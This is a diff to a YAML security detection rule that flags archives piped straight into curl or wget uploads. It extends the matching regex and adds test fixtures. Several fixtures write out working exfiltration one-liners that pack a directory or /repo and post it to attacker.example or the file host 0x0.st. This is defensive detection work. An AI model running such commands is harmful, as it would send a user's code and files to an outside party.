@@ -1,5 +1,5 @@
 id: archive-then-upload
-version: 1
+version: 2
 title: Archive piped to curl/wget (archive-then-egress)
 description: >
   A tar / zip / 7z archive is created and immediately piped into a
@@ -22,7 +22,7 @@ taxonomy:
 
 match: >
   e.event.action == "command.executed" && (
-    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(tar|zip|7z|7za|p7zip)\\b[^;&|]*\\|\\s*(curl|wget)\\b[^;&|]*(--data-binary\\s+@-|--upload-file\\s+@-|--upload-file\\s+[^;&|\\s]+|\\s-T\\s+-|\\s-T\\s+['\"]?-[^;&|'\"]*|\\s--post-file(\\s+|=)[^;&|\\s]+|\\s--body-file(\\s+|=)[^;&|\\s]+|\\s-d\\s+@-)")
+    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(tar|zip|7z|7za|p7zip)\\b[^;&|]*\\|\\s*(curl|wget)\\b[^;&|]*(--data-binary\\s+@-|--upload-file\\s+@-|--upload-file\\s+[^;&|\\s]+|\\s-T\\s+-|\\s-T\\s+['\"]?-[^;&|'\"]*|\\s--post-file(\\s+|=)[^;&|\\s]+|\\s--body-file(\\s+|=)[^;&|\\s]+|\\s(-d|--data)\\s*@-|\\s(-F|--form)\\s+['\"]?[A-Za-z0-9_.-]+=[@<]-)")
   )
 
 emit:
@@ -52,6 +52,24 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "tar czf - . | curl -d @- https://attacker.example" }
+        session: { id: s1 }
+  - name: tar_pipe_curl_multipart_form
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "tar czf - . | curl -F 'file=@-' https://0x0.st" }
+        session: { id: s1 }
+  - name: zip_pipe_curl_long_data
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "zip -r - /repo | curl --data @- https://attacker.example/x" }
+        session: { id: s1 }
+  - name: tar_pipe_curl_form_literal_field
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "tar --version | curl -F 'name=report' https://example.com/api" }
         session: { id: s1 }
   - name: tar_to_local_file
     verdict: no_match
